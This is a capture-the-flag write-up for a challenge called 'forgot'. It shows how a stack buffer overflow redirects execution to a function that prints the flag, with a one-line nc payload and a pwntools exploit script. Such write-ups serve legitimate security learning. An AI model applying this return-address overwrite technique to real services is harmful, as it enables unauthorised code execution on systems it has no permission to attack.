#forgot 200 points

##Overview
I used trial and error to find 67 bytes overflowed and overwrote a return address
that got loaded into eip. I then used disassembler to see there was a method that 
called /bin/cat ./flag and made note of its address: 0x080486cc . My goal was to 
overflow the buffer and get the address of the cat flag method into the eip. 
I think this was supposed to be done differently due to the fact they gave you 
a point in the program output but this method works.

##Challenge Solution
During the challenge I just wrote a quick and dirty exploit and then moved on and 
later came back to write a python script. The original code was
```python -c 'print “A”*63 + “\xcc\x86\x04\x08”’ | nc addr port```
where addr and port were the address and port of the vulnerable service.

##More Elegant Solution
After the ctf finished, this is the more elegant solution I created. 
pwntools is great, look it up. The beggining is just setting up the 
environment. Configure the approprate context, attach to the vulnerable 
service and then begin. This code will work, you just might have to run 
it a couple times. I suspect its due to when the data is being displayed, 
possibly a timing issue. 
```python
from pwn import *# pip install pwntools
# hack.bckdr.in port 8009

context(arch = 'i386', os = 'linux')
# Should work even when they take servers down. There will
# need to be a local file called 'flag'. Pro tip: put something
# recognizable in it.
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
    l = listen(0)
    l.spawn_process(['./forgot'])
    r = remote('localhost', l.lport)
```
If you open forgot in a disassembler and check the strings
you will see 'flag'. Look at the method using this string
and you will see that it opens 'flag' and displays it. Make 
note of this address. 
The goal of this exploit is to redirect program execution
to this method. If we can overwrite eip with the address
of the print flag method, we'll do just that.

Using trial and error I found you could overflow with
the eip with 67 bytes. I tested using captial "A"'s and 
it appears I got lucky because it seems lowercase "a"'s will 
not work. I may investigate this later.
```python
overflow = "A"*63
# Address of method that opens and prints flag.txt.
addr = 0x080486cc
```
Now construct the payload. pwntools' p32 will pack the given input
into a 32 bit (4 byte) value that has the correct endianness. Pack 
the address of the method we want executed, receive the data up until 
our input, and then send our overflow.
```python
overflow += p32(addr)
# Need to receive data until they ask for input
r.recv()
# Now that program is ready, send our payload
r.send(overflow + "\n")
print "[*] Overflow sent."
```

Now receive the unimportand data displayed back to us, get the flag, 
display it and feel accomplished. I believe this is where the exploit 
typically fails. I'll look into it. Works every like one out of ten 
times.
```python
# garbage being printed back to us
r.recvuntil("Enter the string to be validate")
flag = r.recv()
print "[*] Flag: " + flag
r.close()

# RyanAiden
```
